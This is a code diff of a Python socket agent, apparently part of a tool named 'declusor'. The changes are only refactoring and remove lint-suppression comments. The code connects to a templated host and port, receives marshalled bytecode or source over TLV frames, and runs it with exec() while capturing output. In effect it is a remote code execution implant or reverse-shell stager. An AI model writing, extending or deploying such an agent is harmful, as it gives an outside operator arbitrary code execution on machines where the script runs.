@@ -8,6 +8,8 @@ import socket
 import struct
 import sys
 
+from types import CodeType
+
 HOST, PORT, ACK = ("$DECLUSOR_HOST", int("$DECLUSOR_PORT"), bytes.fromhex("$DECLUSOR_ACK"))
 CH_EXIT = int("$DECLUSOR_CH_EXIT")
 CH_STDOUT = int("$DECLUSOR_CH_STDOUT")
@@ -17,8 +19,6 @@ CH_SIGNAL = int("$DECLUSOR_CH_SIGNAL")
 CH_HEARTBEAT = int("$DECLUSOR_CH_HEARTBEAT")
 MAX_TLV_FRAME_SIZE = int("$DECLUSOR_MAX_TLV_FRAME_SIZE")
 SESSION_SCOPE: dict[str, object] = {"__name__": "__declusor__"}
-
-CodeType = type((lambda: None).__code__)
 
 
 def _read_exact(sock: socket.socket, length: int) -> bytes | None:
@@ -73,9 +73,8 @@ def _execute(payload_bytes: bytes, sock: socket.socket) -> None:
         try:
             obj = marshal.loads(payload_bytes)
 
-            match obj:
-                case CodeType():
-                    code = obj
+            if isinstance(obj, CodeType):
+                code = obj
         except Exception:
             pass
 
@@ -83,8 +82,8 @@ def _execute(payload_bytes: bytes, sock: socket.socket) -> None:
             source = payload_bytes.decode(errors="replace")
             code = compile(source, "<remote>", "exec")
 
-        exec(code, SESSION_SCOPE)  # noqa: S102
-    except BaseException as exc:  # noqa: B036
+        exec(code, SESSION_SCOPE)
+    except BaseException as exc:
         buf.write(f"[py_socket error] {type(exc).__name__}: {exc}\n")
     finally:
         sys.stdout, sys.stderr = old_out, old_err
@@ -104,6 +103,7 @@ def main() -> None:
         pass
 
     existing_sock = globals().get("_sock")
+
     match existing_sock:
         case socket.socket():
             sock = existing_sock
@@ -135,9 +135,8 @@ def main() -> None:
                 try:
                     obj = marshal.loads(helpers_bytes)
 
-                    match obj:
-                        case CodeType():
-                            helpers_code = obj
+                    if isinstance(obj, CodeType):
+                        helpers_code = obj
                 except Exception:
                     pass
 
